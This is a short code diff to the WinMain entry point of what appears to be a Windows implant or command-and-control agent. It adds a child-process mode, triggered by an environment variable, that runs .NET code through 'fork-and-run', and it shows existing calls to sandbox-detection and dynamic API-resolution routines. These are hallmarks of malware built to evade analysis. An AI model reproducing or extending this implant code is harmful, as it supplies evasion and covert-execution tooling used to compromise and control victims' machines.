@@ -7,9 +7,16 @@
 #include "commands.h"
 #include "evasion.h"
 #include "api_resolve.h"
+#include "dotnet.h"
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
+
+    // Child process mode for DOTNET_EXEC fork-and-run.
+    if (GetEnvironmentVariableA("__ENDGAME_CLR_CHILD", NULL, 0) > 0) {
+        clr_child_run();
+        ExitProcess(0);
+    }
 
     api_init();
     sandbox_check();
